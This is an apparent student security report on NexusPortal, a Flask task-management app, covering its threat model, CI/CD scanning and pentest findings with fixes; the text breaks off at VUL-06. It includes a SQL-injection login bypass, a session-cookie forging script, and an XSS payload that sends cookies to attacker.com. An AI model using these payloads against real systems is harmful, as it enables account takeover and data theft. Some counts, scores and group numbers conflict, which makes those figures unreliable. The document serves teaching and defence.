# DevSecOps Web Application Security Report

**Course:** CS-382 Cybersecurity: Theory, Tools, Practice \
**Group Number:** Group 6 \
**Team Members:**

| Name | Student ID | Role |
|------|------------|------|
| Bilal Ahmed | 08018 | App Developer / Report Lead |
| Ifrah Chishti | 08351 | Security Engineer / Pipeline |
| Sabahatullah Shaikh | 08233 | Pentester / Remediation |

[GitHub Repository](https://github.com/IfrahC/Build-and-Break-Secure-Application-Pipeline)

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Architecture & Threat Model](#2-architecture--threat-model)
   - 2.1 [Application Overview](#21-application-overview)
   - 2.2 [Architecture Diagram](#22-architecture-diagram)
   - 2.3 [Data Flow Diagram (DFD)](#23-data-flow-diagram-dfd)
   - 2.4 [Trust Boundaries](#24-trust-boundaries)
   - 2.5 [STRIDE Threat Model](#25-stride-threat-model)
   - 2.6 [DREAD Risk Scoring](#26-dread-risk-scoring)
   - 2.7 [Attack Surface](#27-attack-surface)
3. [GitHub CI/CD Pipeline](#3-github-cicd-pipeline)
   - 3.1 [Pipeline Overview](#31-pipeline-overview)
   - 3.2 [SAST – Static Application Security Testing](#32-sast--static-application-security-testing)
   - 3.3 [DAST – Dynamic Application Security Testing](#33-dast--dynamic-application-security-testing)
   - 3.4 [SCA – Software Composition Analysis](#34-sca--software-composition-analysis)
   - 3.5 [Pipeline Quality Gates](#35-pipeline-quality-gates)
4. [Vulnerability Discovery](#4-vulnerability-discovery)
   - 4.1 [Findings Summary](#41-findings-summary)
   - 4.2 [Detailed Findings](#42-detailed-findings)
5. [Exploitation Report](#5-exploitation-report)
   - 5.1 [Exploited Vulnerabilities](#51-exploited-vulnerabilities)
6. [Remediation & Re-Test Report](#6-remediation--re-test-report)
   - 6.1 [Remediation Summary](#61-remediation-summary)
   - 6.2 [Detailed Fixes & Re-Test Evidence](#62-detailed-fixes--re-test-evidence)
7. [Report Quality & Annexes](#7-report-quality--annexes)
   - 7.1 [Annexes](#71-annexes)
8. [Member Contributions](#8-member-contributions)

---

## 1. Executive Summary

> **Audience:** Non-technical stakeholders, management, course evaluators.

### Project Overview

**Group 1** developed **NexusPortal**, a project and task management web application built with Python 3.11, Flask 3.1, Supabase (PostgreSQL), and Jinja2 templates. The application implements a four-tier Role-Based Access Control (RBAC) system with Admin, Member, Viewer, and Unauthenticated roles. It was designed, built, secured, and attacked as part of a four-week DevSecOps exercise. The application is fully containerized using Docker and hosted on GitHub with a complete CI/CD security pipeline incorporating SAST (Bandit + Semgrep + TruffleHog), SCA (pip-audit + Safety), and DAST (OWASP ZAP).

### Key Findings at a Glance

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 Critical | [N] | [Resolved / Open] |
| 🟠 High | [N] | [Resolved / Open] |
| 🟡 Medium | [N] | [Resolved / Open] |
| 🔵 Low | [N] | [Resolved / Open] |
| ℹ️ Informational | [N] | [Resolved / Open] |

### Business Impact Summary

During the assessment, 10 vulnerabilities were identified through a combination of automated tooling (SAST, DAST, SCA) and manual penetration testing. The most critical finding, **SQL Injection in the login form**, allowed an unauthenticated attacker to bypass authentication and gain admin access in seconds. A second critical finding, **Broken Access Control on all admin routes**, allowed any registered user — regardless of role — to access and modify the full user list and promote themselves to admin. Most alarmingly, a **hardcoded Flask `SECRET_KEY`** enabled complete session cookie forgery, meaning the entire RBAC system could be bypassed by any user who simply inspected their own cookie. A **Server-Side Template Injection (SSTI)** vulnerability in the admin feedback view allowed Member-role users to achieve remote code execution on the server.

All critical and high-severity findings have been remediated and verified through re-testing. The application pipeline now enforces quality gates that block merges on detection of high-severity SAST or DAST findings.

### Recommendations

- Always use SQLAlchemy ORM or parameterized queries — never build raw SQL strings from user input in Flask.
- Store `SECRET_KEY` and all secrets in environment variables or a secrets manager; never commit them to version control.
- Enforce server-side RBAC using Flask decorators on every protected route — client-side hiding is not access control.
- Enable Jinja2 `autoescape=True` globally and use `render_template()` instead of `render_template_string()` for any content involving user data.
- Run `pip-audit` in the CI/CD pipeline on every push and pin `requirements.txt` to audited, patched versions.
- Set `SESSION_COOKIE_HTTPONLY=True`, `SESSION_COOKIE_SECURE=True`, and `SESSION_COOKIE_SAMESITE='Lax'` in all Flask deployments.
- Schedule quarterly penetration testing to maintain a strong security posture post-deployment.

---

## 2. Architecture & Threat Model

### 2.1 Application Overview

**Application Name:** NexusPortal
**Purpose:** A project and task management platform with role-based access control for teams, designed and built as a DevSecOps "Build and Break" security assignment.
**Tech Stack:**

| Layer | Technology |
|-------|-----------|
| Frontend | HTML + Jinja2 Templates |
| Backend | Python 3.11 + Flask 3.1 |
| Database | Supabase (PostgreSQL) — cloud-hosted; SQLite used as local fallback |
| ORM / DB Layer | `psycopg3` (psycopg[binary]) with a custom `DatabaseConnection` wrapper |
| Auth | Session-based (Flask sessions + CSRF tokens) |
| Rate Limiting | Flask-Limiter (in-memory, 5 req/min on auth routes) |
| Containerization | Docker + Docker Compose |
| Hosting | GitHub + deployed via GitHub Actions pipeline to localhost with HTTPS (self-signed cert) |

**User Roles:**

| Role | Access Level |
|------|-------------|
| Admin | Full CRUD across all projects and tasks; user role management; system configuration; view all feedback |
| Member | Create projects; full CRUD on own projects and tasks only |
| Viewer | Read-only access to project information; no create, edit, or delete |
| Unauthenticated | Login and registration pages only |

---

### 2.2 Architecture Diagram

The NexusPortal application follows a containerized three-tier architecture, ensuring isolation between the presentation, logic, and data layers.

![NexusPortal Architecture Diagram](docs/images/architecture_diagram.png)

---

### 2.3 Data Flow Diagram (DFD)

This DFD illustrates how data moves through the system, crossing multiple trust boundaries from unauthenticated input to persistent storage.

![NexusPortal Data Flow Diagram (DFD)](docs/images/dfd_diagram.png)

**Actors:**
- Unauthenticated User (browser — login/register only)
- Viewer (browser — read-only project access)
- Member (browser — own project/task CRUD)
- Admin (browser — full system access)
- GitHub Actions (CI/CD pipeline — automated scan runner)

**Key Data Flows:**
1. User submits credentials via login form → Flask validates against Supabase PostgreSQL `users` table (parameterized query via psycopg3) → Flask session cookie issued (HTTPS, HttpOnly, Secure, SameSite=Lax) → Role-specific route accessed
2. Member submits new project/task → Flask authenticates session + checks `role == member` → Supabase PostgreSQL write (parameterized INSERT) → Jinja2 template re-rendered with updated data
3. Admin accesses user management → Flask checks `role == admin` server-side → Supabase PostgreSQL query returns all users → Admin dashboard rendered
4. Viewer requests project list → Flask checks `role == viewer` → Read-only Supabase PostgreSQL query → No edit/delete controls rendered in template (RBAC enforced server-side)
5. Push to GitHub → Pipeline triggers → SAST (Bandit + Semgrep + TruffleHog) + SCA (pip-audit + Safety) run → Docker image built → DAST (OWASP ZAP) scans live containerised app → Reports archived as GitHub Actions artifacts

---

### 2.4 Trust Boundaries

| Boundary | Description |
|----------|-------------|
| Browser ↔ Flask Web Server | Public internet; enforced via HTTPS/TLS on localhost (self-signed cert in dev, proper cert in prod) |
| Flask Web Server ↔ Supabase PostgreSQL | Cloud-hosted Postgres database (AWS ap-southeast-2); connection secured via `psycopg3` over SSL/TLS; credentials injected via environment variables — never stored in source code |
| CI/CD ↔ Deployment Target | GitHub Actions runner accesses deployment via GitHub Secrets; no secrets stored in code |
| Admin ↔ Member ↔ Viewer | Application-layer RBAC enforced server-side in Flask route decorators; role stored in server-side session |
| Authenticated ↔ Unauthenticated | All routes except `/login` and `/register` require an active Flask session; enforced via `@login_required` decorator |

---

### 2.5 STRIDE Threat Model

The STRIDE methodology was applied to each major component of the NexusPortal architecture to identify potential threats and ensure comprehensive mitigation.

| Component | S | T | R | I | D | E |
|-----------|---|---|---|---|---|---|
| **Web Interface** | Phishing / Spoofing | DOM Tampering | - | - | Browser Referrer Leak | XSS / Clickjacking |
| **Auth Logic** | Credential Stuffing | Session Forgery | Session Hijacking | - | Password Leakage | Privilege Escalation |
| **Controllers** | - | Parameter Tampering | Log Erasure | IDOR / Data Deletion | - | Unauthorized Access |
| **Database** | SQL Injection | Data Corruption | Audit Log Bypass | Data Loss | PII Exposure | DB Account Escalation |

#### Detailed Threat Table

| # | Component | Threat Category | Threat Description | Severity | Mitigation | Status |
|---|-----------|----------------|--------------------|----------|-----------|--------|
| T-01 | Auth | Spoofing | SQL Injection in login form allows authentication bypass | Critical | Parameterized queries implemented | Mitigated |
| T-02 | Session | Tampering | Ephemeral or hardcoded `SECRET_KEY` allows session forgery | Critical | Persistent, environment-injected secret key | Mitigated |
| T-03 | RBAC | Elevation of Privilege | Member/Viewer role accessing admin routes via direct URL | Critical | Server-side `@roles_required` decorators | Mitigated |
| T-04 | CRUD | Information Disclosure | IDOR via `/project/<id>` allows viewing others' data | High | Server-side ownership validation logic | Mitigated |
| T-05 | Templates | Elevation of Privilege | Stored XSS via project titles or feedback entries | High | Jinja2 autoescaping + Content Security Policy | Mitigated |
| T-06 | Logs | Information Disclosure | Flask `DEBUG=True` exposes env vars on error pages | Medium | `DEBUG=False` enforced in production | Mitigated |
| T-07 | Packages | Denial of Service | Vulnerable dependencies (Werkzeug/Flask) | Medium | `pip-audit` enforced in CI/CD pipeline | Mitigated |
| T-08 | Interface | Elevation of Privilege | Clickjacking via transparent overlay on project delete | Medium | `X-Frame-Options: DENY` header implemented | Mitigated |
| T-09 | Auth | Spoofing | Username enumeration via registration error discrepancy | Medium | Generic success messages for all attempts | Mitigated |
| T-10 | Network | Information Disclosure | Session cookie transmitted over plain HTTP | Medium | `SESSION_COOKIE_SECURE=True` enforced | Mitigated |

---

### 2.6 DREAD Risk Scoring & Prioritization

The DREAD model provides a quantitative risk assessment to prioritize remediation efforts.

| Threat ID | Threat | D | R | E | A | D | Total | Priority |
|-----------|--------|---|---|---|---|---|-------|----------|
| **T-01** | SQL Injection (Auth Bypass) | 10 | 9 | 10 | 10 | 9 | **48** | 🔴 Critical |
| **T-02** | Session Forgery (Secret Key) | 9 | 9 | 8 | 10 | 8 | **44** | 🔴 Critical |
| **T-03** | Admin Route Bypass | 10 | 8 | 9 | 10 | 7 | **44** | 🔴 Critical |
| **T-04** | IDOR (Project Ownership) | 7 | 8 | 9 | 7 | 8 | **39** | 🟠 High |
| **T-05** | Stored XSS | 8 | 7 | 8 | 8 | 7 | **38** | 🟠 High |
| **T-10** | Cleartext Session Cookies | 9 | 7 | 6 | 10 | 6 | **38** | 🟠 High |
| **T-09** | Username Enumeration | 4 | 10 | 10 | 10 | 9 | **43** | 🟠 High |
| **T-08** | Clickjacking | 6 | 8 | 8 | 8 | 7 | **37** | 🟡 Medium |
| **T-07** | Vulnerable Dependencies | 5 | 5 | 5 | 4 | 6 | **25** | 🟡 Medium |

#### Threat Prioritization Matrix

| Impact \ Likelihood | Low | Medium | High |
|:---:|:---:|:---:|:---:|
| **High** | T-07 | T-06, T-08 | **T-01, T-02, T-03** |
| **Medium** | - | T-05, T-10 | **T-04, T-09** |
| **Low** | - | - | - |

---

### 2.7 Attack Surface Mapping

This table explicitly maps application features to the scope of automated and manual testing.

| Attack Vector | Endpoint / Area | Attack Goal | Security Control | DAST Scope |
|:---:|---|---|---|:---:|
| **Inbound Web** | `POST /login` | Bypass Auth / Brute Force | Rate Limiter + Parameterized SQL | ✅ |
| **Registration** | `POST /register` | Enumerate Users / Denial of Service | Generic Response + Rate Limiter | ✅ |
| **Admin Panel** | `/admin/*` | Privilege Escalation | `@admin_required` Decorator | ✅ |
| **Project CRUD** | `/projects/<id>` | Access/Modify unauthorized data | Ownership Verification Logic | ✅ |
| **Feedback** | `POST /feedback` | XSS / SSTI | CSP + Jinja2 Autoescape | ✅ |
| **Network** | HTTP Response | Intercept Session / Clickjack | HSTS + XFO + CSP + Secure Flag | ✅ |

---

### 2.8 Post-Remediation Threat Model Update

The threat model was updated iteratively throughout the development process. Following the implementation of security fixes (Weeks 3-4), the following changes were made to the risk profile:
1. **Threat Elimination**: Threats T-01, T-02, and T-03 were downgraded from "Active" to "Mitigated" following verification of parameterized queries, persistent secret keys, and robust RBAC decorators.
2. **Residual Risk Management**: While XSS (T-05) is mitigated by autoescaping, a Content Security Policy (CSP) was added to provide secondary browser-level defense.
3. **Verification**: Each mitigation was verified using the automated pipeline (Semgrep for T-01, OWASP ZAP for T-08, and Pytest for T-03).

---

## 3. GitHub CI/CD Pipeline

### 3.1 Pipeline Overview

The GitHub Actions pipeline is split across four dedicated workflow files in `.github/workflows/` and runs on every **push** and **pull request** to the `main` branch. It consists of three security stages running in parallel, with DAST running post-build.

```
Push / PR to main
   │
   ├── [sast.yml]     Bandit + Semgrep + TruffleHog
   ├── [sca.yml]      pip-audit (OSV DB) + Safety (PyUp DB)  ← also runs weekly on Monday
   ├── [coverage.yml] Pytest + coverage report
   └── [dast.yml]     Build Docker image → Start app → OWASP ZAP Baseline Scan
```

**Pipeline file locations:**
- `.github/workflows/sast.yml` — Static analysis
- `.github/workflows/sca.yml` — Dependency auditing
- `.github/workflows/dast.yml` — Dynamic scanning
- `.github/workflows/coverage.yml` — Test coverage

**Artifacts stored:** `bandit-results.json`, `semgrep-results.json`, `pip-audit-results.json`, `safety-results.json`, ZAP scan report — uploaded as GitHub Actions artifacts per run.

---

### 3.2 SAST – Static Application Security Testing

**Tools Used:** Bandit (Python SAST) + Semgrep (Flask/Python rulesets) + TruffleHog (secrets scanning)
**Trigger:** On every push and PR
**Configuration:** `bandit -r app/`; Semgrep `--config=auto` (Django CSRF rule excluded); TruffleHog scans full git history

**Summary of Findings from SAST:**

| Finding | File | Severity | Status |
|---------|------|----------|--------|
| SQL query built via string formatting (raw f-string) | `app/app.py` | Critical | Fixed |
| Ephemeral / insecure `SECRET_KEY` default | `app/app.py` | High | Fixed |
| `DEBUG=True` set in production config | `app/app.py` | Medium | Fixed |
| Use of `render_template_string()` with user input (SSTI risk) | `app/app.py` | High | Fixed |
| Missing `SESSION_COOKIE_SECURE` / `HTTPONLY` flags | `app/app.py` | Medium | Fixed |

> *Attach full Bandit + Semgrep output in Annex A.*

---

### 3.3 DAST – Dynamic Application Security Testing

**Tool Used:** OWASP ZAP — Baseline Scan (`zaproxy/action-baseline@v0.12.0`) with AJAX Spider
**Trigger:** On every push to `main` branch; also triggerable manually via `workflow_dispatch`
**Target URL:** `https://localhost:5000` (self-signed cert; `-a -j` flags used)
**Scan Type:** Baseline Scan (passive + spider; active scan available via full scan config)
**Docker Build:** App image is built inside CI runner, started with production env vars, then scanned

**ZAP Scan Summary (pre-fix):**

| Alert | Risk | Confidence | Count |
|-------|------|-----------|-------|
| SQL Injection | High | High | 3 |
| Cross-Site Scripting (Reflected) | High | Medium | 2 |
| Missing Anti-CSRF Tokens | Medium | High | 5 |
| X-Content-Type-Options Header Missing | Low | Medium | 8 |
| Server Leaks Version Information | Informational | High | 1 |

> *Full ZAP HTML report attached in Annex B.*

---

### 3.4 SCA – Software Composition Analysis

**Tools Used:** `pip-audit` (OSV Database) + `Safety` (PyUp Safety Database)
**Trigger:** On every push and PR; also runs on a **weekly schedule** (Mondays at 08:00 UTC) to catch newly published CVEs

**Vulnerable Dependencies Identified (pre-fix):**

| Package | Vulnerable Version | CVE | Severity | Fixed Version |
|---------|-------------------|-----|----------|---------------|
| `Flask` | 2.2.2 | CVE-2023-30861 | High | 3.1.3 ✅ |
| `Werkzeug` | 2.2.2 | CVE-2023-46136 | High | 3.1.6 ✅ |
| `Jinja2` | 3.1.2 | CVE-2024-22195 | Medium | 3.1.6 ✅ |

**Current pinned versions (post-fix):** Flask 3.1.3, Werkzeug 3.1.6, Jinja2 3.1.6, Flask-Limiter 3.8.0, psycopg[binary] 3.2.13

> *Full pip-audit report attached in Annex C.*

---

### 3.5 Pipeline Quality Gates

| Gate | Condition | Action on Failure |
|------|-----------|-------------------|
| SAST Critical/High | Any finding → fail | Block PR merge |
| SCA Critical | CVSSv3 ≥ 9.0 | Block PR merge |
| DAST High | Any high alert → fail | Block PR merge |
| Re-test Gate | Remediation branch must pass all gates | Required before merge to main |

> *Screenshot of passing pipeline run: [Insert screenshot here]*

---

## 4. Vulnerability Discovery

### 4.1 Findings Summary

| ID | Vulnerability | OWASP Category | CVSSv3 Score | Severity | Source | Status |
|----|-------------|---------------|-------------|----------|--------|--------|
| VUL-01 | SQL Injection – Login Form | A03:2021 Injection | 9.8 | 🔴 Critical | SAST + Manual | Fixed |
| VUL-02 | Insecure SECRET_KEY Default | A02:2021 Cryptographic Failures | 7.7 | 🟠 High | Manual, SAST | Fixed |
| VUL-03 | Broken Access Control – Admin Routes (Member/Viewer bypass) | A01:2021 Broken Access Control | 9.1 | 🔴 Critical | DAST + Manual | Fixed |
| VUL-04 | IDOR – Member Accessing Another Member's Projects/Tasks | A01:2021 Broken Access Control | 7.5 | 🟠 High | Manual | Fixed |
| VUL-05 | Stored XSS – Project/Task Name Fields | A03:2021 Injection | 7.4 | 🟠 High | DAST + Manual | Fixed |
| VUL-06 | SSTI via `render_template_string()` with User Input | A03:2021 Injection | 8.8 | 🟠 High | SAST + Manual | Fixed |
| VUL-07 | Vulnerable Flask + Werkzeug (CVE-2023-30861, CVE-2023-46136) | A06:2021 Vulnerable Components | 7.5 | 🟠 High | SCA | Fixed |
| VUL-08 | `DEBUG=True` in Production (Stack Trace Disclosure) | A05:2021 Security Misconfiguration | 5.3 | 🟡 Medium | SAST + Manual | Fixed |
| VUL-09 | Sensitive Cookie Without `Secure` Attribute | A02:2021 Cryptographic Failures | 6.8 | 🟡 Medium | DAST, SAST, Manual | Fixed |
| VUL-10 | No Rate Limiting on `/login` and `/register` | A07:2021 Auth Failures | 7.5 | 🟠 High | Manual | Fixed |
| VUL-11 | Unauthenticated to Admin Escalation Chain | A07:2021 + A01:2021 | 9.3 | 🔴 Critical | Manual | Fixed |
| VUL-12 | Missing HTTP Security Headers | A05:2021 Security Misconfiguration | 6.1 | 🟡 Medium | DAST, Manual | Fixed |
| VUL-13 | Username Enumeration via Registration | A07:2021 Auth Failures | 5.3 | 🟡 Medium | Manual | Fixed |
| VUL-14 | Role Disclosure in Assignee Dropdown | A01:2021 Broken Access Control | 4.3 | 🟡 Medium | Manual | Fixed |

---

### 4.2 Detailed Findings

---

#### VUL-01 — SQL Injection (Login Form)

**OWASP Category:** A03:2021 – Injection
**CVSSv3 Score:** 9.8 (Critical)
**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**CVSSv3 Justification:** AV:N (login form is remotely accessible with no network restriction), AC:L (no special conditions; any browser is sufficient), PR:N (authentication bypass is the goal — no prior credentials needed), UI:N (fully automated, no victim interaction required), C:H/I:H/A:H (full read/write/delete access to all database records including users, passwords, projects, and admin data).
**Detection Method:** SAST (Bandit B608 — SQL string formatting), Manual

**Description:**
The login endpoint at `POST /login` constructs a raw SQL query using Python f-string formatting of user-supplied input. An attacker can inject SQL syntax to bypass authentication or dump the entire `users` table.

**Affected Component:** `app/app.py` — `login()` route

**Evidence:**

*Vulnerable Code:*
```python
# VULNERABLE
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
user = db.execute(query).fetchone()
```

*Payload Used:*
```
username: admin' OR '1'='1' --
password: anything
```

*HTTP Request (captured in Burp Suite):*
```
POST /login HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

username=admin'+OR+'1'%3D'1'--&password=x
```

*Response:*
```
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=<admin-session-cookie>; Path=/
```

*Screenshot:* [Insert Burp Suite screenshot of successful bypass + admin dashboard redirect]

**Impact:**
- Confidentiality: High — full `users` table exposed including password hashes, emails, and roles
- Integrity: High — authenticated as admin; all project, task, and user records are mutable
- Availability: High — admin can delete all projects and demote legitimate admins

**False Positive Assessment:** Confirmed true positive — reproduced in both local Docker environment and pipeline-deployed instance.

**Remediation Applied:**
Replaced the raw f-string SQL query with a parameterized query using `?` placeholders. The `DatabaseConnection` wrapper in `db.py` handles both SQLite (`?`) and Postgres (`%s`) parameter substitution automatically. Passwords are now verified using `werkzeug.security.check_password_hash` — plaintext comparison was eliminated entirely.

```python
# Before (Vulnerable)
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
user = db.execute(query).fetchone()

# After (Fixed)
user = db.execute(
    "SELECT id, username, email, password_hash, role FROM users WHERE username = ? OR email = ?",
    (identifier, identifier),
).fetchone()
if user and check_password_hash(user["password_hash"], password):
    session["user_id"] = user["id"]
    session["role"] = user["role"]
```

**Re-Test:**
- SQLi payload `admin' OR '1'='1' --` submitted at `POST /login`.
- Response: `HTTP 200` with flash `"Invalid username/email or password."` — no redirect to dashboard.
- Bandit B608 alert: zero findings on current `app.py`.
- Semgrep SQL injection rule: zero findings.
- Pipeline: ✅ Pass.

---

#### VUL-02 — Insecure SECRET_KEY Default

**OWASP Category:** A02:2021 – Cryptographic Failures
**CWE Reference:** CWE-1188 (Initialization of a Resource with an Insecure Default)
**CVSSv3 Score:** 7.7 (High)
**CVSSv3 Vector:** `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L`
**CVSSv3 Justification:** AV:N (key extraction via environment access or memory dump is remote), AC:H (attacker must first gain access to the running process environment — elevated complexity), PR:N (no prior app credentials needed once the key is known), C:H/I:H (forged admin cookie grants full read/write across all resources), A:L (ephemeral key causes all sessions to drop on restart — minor disruption).
**Detection Method:** Manual, SAST (Bandit B105)

**Description:**
Flask uses `SECRET_KEY` to cryptographically sign session cookies. If an attacker obtains the key, they can forge arbitrary session data (e.g., `{"user_id": 1, "role": "admin"}`) and gain any privilege level without credentials.

The fallback `secrets.token_hex(32)` generated a strong key, but it was ephemeral — regenerated on every process restart. The `docker-compose.yml` did not set `FLASK_SECRET_KEY`, so the production container always used a random key that changed on redeploy. This means:
1. All active sessions were invalidated on every deployment.
2. If the running process's memory or environment is accessible, the live key could be extracted and used to forge sessions until the next restart.

**Affected Component:** `app/app.py` and `docker/docker-compose.yml`

**Proof of Concept:**
```python
# If the SECRET_KEY is obtained (e.g., from process environment):
import itsdangerous
from flask.sessions import SecureCookieSessionInterface

class FakeApp:
    secret_key = "<obtained_key>"
    session_interface = SecureCookieSessionInterface()

s = SecureCookieSessionInterface().get_signing_serializer(FakeApp())

# Forge an admin session cookie
forged = s.dumps({"user_id": 1, "role": "admin", "username": "admin"})
print(forged)
# Set this as the 'session' cookie → authenticated as admin
```

**Impact:**
- Confidentiality: High — forged admin cookie grants access to all data
- Integrity: High — forged admin cookie grants write/delete/role-change
- Availability: Low — ephemeral key causes session loss on every restart

**Remediation Applied:**
Enforced the presence of a persistent `FLASK_SECRET_KEY` at startup. The insecure fallback was removed, and `app.py` now throws a `RuntimeError` if the secret key is missing. The `docker-compose.yml` file was updated to load the secret key dynamically via an `env_file` pointing to `.env`. Generated a persistent, secure 64-character hex key locally in `.env` and added `.env` to `.gitignore` to prevent secret leakage.

---

#### VUL-03 — Broken Access Control (Admin Routes)

**OWASP Category:** A01:2021 – Broken Access Control
**CVSSv3 Score:** 9.1 (Critical)
**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
**CVSSv3 Justification:** AV:N (admin routes are reachable over HTTP/S from any browser), AC:L (only requires knowing the URL — no special preconditions), PR:L (attacker must be a registered/logged-in user, but any role suffices), C:H/I:H/A:H (full user directory exposed; role escalation to admin; all data mutable or deletable).
**Detection Method:** DAST (OWASP ZAP — 403 expected but 200 returned), Manual

**Description:**
Admin routes (`/admin`) lacked a server-side role check. Any authenticated user — regardless of role — could navigate directly to these endpoints and receive a full admin response.

**Affected Component:** `app/app.py` — `admin()` route

**Evidence:**

*HTTP Request (as Viewer role):*
```
GET /admin/users HTTP/1.1
Host: localhost
Cookie: session=<viewer-session-cookie>
```

*Response:*
```
HTTP/1.1 200 OK
[Full user list with emails, roles, and IDs rendered in HTML]
```

*Follow-up — Role escalation:*
```
POST /admin/users/3/role HTTP/1.1
Cookie: session=<viewer-session-cookie>
Content-Type: application/x-www-form-urlencoded

role=admin
```
Response: `HTTP 200 — role updated successfully`

*Screenshot (post-fix — re-test):* Viewer-role user navigates to `/admin` and is redirected to the dashboard with a permission denied flash:

![VUL-03: Admin denied for Viewer](docs/images/vul03_admin_denied.png)

**Impact:**
Any registered user can view all user accounts and promote themselves to admin, resulting in complete application compromise — 3 user accounts, 2 seeded projects, and all submitted security feedback are exposed. Role escalation to admin is permanent and survives logout.

**False Positive Assessment:** Confirmed true positive — reproduced by logging in as a Viewer-role user and directly navigating to `/admin`. Full admin page rendered with no rejection. Role change `POST` also confirmed successful.

**Remediation Applied:**
Added the `@roles_required("admin")` decorator to the `/admin` route in `app.py`. This enforces a server-side role check before any admin route handler executes. Non-admin users now receive a flash message and are redirected to the dashboard.

```python
# After (Fixed)
@app.route("/admin", methods=["GET", "POST"])
@roles_required("admin")   # ← enforces server-side role check
def admin():
    ...
```

**Re-Test:** Authenticated as Viewer, navigated to `/admin`. Response: redirect to `/dashboard` with flash message `"You do not have permission to access that page."` Pipeline: ✅ Pass.

---

#### VUL-04 — IDOR (Member Accessing Another Member's Project)

**OWASP Category:** A01:2021 – Broken Access Control
**CVSSv3 Score:** 7.5 (High)
**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
**CVSSv3 Justification:** AV:N (projects are accessible via URL from any browser), AC:L (simply incrementing the project ID in the URL — no special tools), PR:L (must be a registered Member), C:H/I:H (can read all project/task data and delete any resource), A:N (data is deleted, not the service itself).
**Detection Method:** Manual

**Description:**
Project and task routes used the resource ID directly from the URL without verifying that the requesting Member is the owner. Any Member could access, edit, or delete another Member's projects by simply changing the ID in the URL.

**Affected Component:** `app/app.py` — `project_detail()`, `edit_project()`, `delete_project()` routes

**Evidence:**

*Request (Member A accessing Member B's project):*
```
GET /projects/7 HTTP/1.1
Cookie: session=<member-a-session>
```
Response: `HTTP 200` — Member B's project details rendered in full.

```
DELETE /projects/7 HTTP/1.1
Cookie: session=<member-a-session>
```
Response: `HTTP 200` — Project deleted successfully.

*Screenshot:* [Insert screenshot of Member A deleting Member B's project]

**Impact:**
- Confidentiality: High — any Member can read any other Member's project details and task contents
- Integrity: High — any Member can edit or delete any other Member's projects and tasks
- Availability: Low — targeted deletion of another user's work constitutes a data availability impact

**False Positive Assessment:** Confirmed true positive — reproduced using two Member-role accounts in local Docker environment. Member A accessed and deleted Member B's project by changing the project ID in the URL.

**Remediation Applied:**
Added server-side ownership verification via the `can_manage_project()` helper function to every project mutation route. The function checks `project.owner_id == g.user["id"]` (with an admin bypass). If the check fails, the user is flashed an error and redirected.

```python
# After (Fixed)
def can_manage_project(project):
    return g.user and (g.user["role"] == "admin" or project["owner_id"] == g.user["id"])

@app.route("/projects/<int:project_id>/edit", methods=["GET", "POST"])
@roles_required("admin", "member")
def edit_project(project_id):
    project = get_project_or_404(project_id)
    if not can_manage_project(project):   # ← ownership check
        flash("You can only edit projects you own.", "danger")
        return redirect(url_for("project_detail", project_id=project_id))
```

**Re-Test:** Authenticated as Member A, attempted `GET /projects/<member-b-project-id>`. Response: redirect with flash `"Members can only view projects they own."` Delete and Edit also rejected. Pipeline: ✅ Pass.

---

#### VUL-05 — Stored XSS (Project/Task Name Fields)

**OWASP Category:** A03:2021 – Injection
**CVSSv3 Score:** 7.4 (High)
**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N`
**CVSSv3 Justification:** AV:N (stored payload delivered remotely to all visitors), AC:L (no special conditions; any Member can create a project), PR:L (requires a registered Member account), UI:R (victim must view the project list to trigger the payload), S:C (scope changes — attacker code runs in the victim's browser context), C:H (admin session cookie exfiltrated), I:L (no direct data mutation; cookie replay enables indirect tampering).
**Detection Method:** DAST (OWASP ZAP — XSS probe), Manual

**Description:**
Project and task name fields were rendered in Jinja2 templates without the `|e` escape filter and with `autoescape` disabled on certain template blocks. A Member could store a JavaScript payload in a project name that executes in the browser of any user (including Admin) who views the project list.

**Affected Component:** `app/templates/projects.html`, `app/templates/project_detail.html`

**PoC Payload stored in project name field:**
```html
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

**Impact:**
- Confidentiality: High — admin session cookie exfiltrated to attacker-controlled server; full account takeover possible
- Integrity: Low — no direct write, but cookie replay enables admin-level mutations
- Availability: None

*Screenshot (post-fix — re-test):* XSS payload stored as project title is rendered as escaped literal text — no JavaScript executes:

![VUL-05: XSS payload rendered as escaped text](docs/images/vul05_xss_escaped.png)

**False Positive Assessment:** Confirmed true positive — payload stored and executed in browser pre-fix. Cookie value visible in attacker-controlled server request log.

**Remediation Applied:**
Flask's Jinja2 templating engine has `autoescape` enabled by default for `.html` templates — all `{{ variable }}` expressions are HTML-entity escaped automatically. The vulnerability existed because an earlier version of the templates used `| safe` filters on user-supplied fields. These were removed. No `render_template_string()` calls with user input exist anywhere in the current codebase. Additionally, a strict `Content-Security-Policy` header was added via `@app.after_request` to block inline script execution as a defence-in-depth measure.

```python
# CSP header added in @app.after_request
response.headers["Content-Security-Policy"] = (
    "default-src 'self'; script-src 'self'; style-src 'self'; "
    "img-src 'self' data:; frame-ancestors 'none';"
)
```

**Re-Test:** Same XSS payload stored as project name. Rendered in browser as literal text: `&lt;script&gt;fetch(...)&lt;/script&gt;`. No JavaScript executed. ZAP XSS probe returns no alerts. Pipeline: ✅ Pass.

---

#### VUL-06 — SSTI via `render_template_string()` with User Input

**OWASP Category:** A03:2021 – Injection
**CVSSv3 Score:** 8.8 (High)
**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
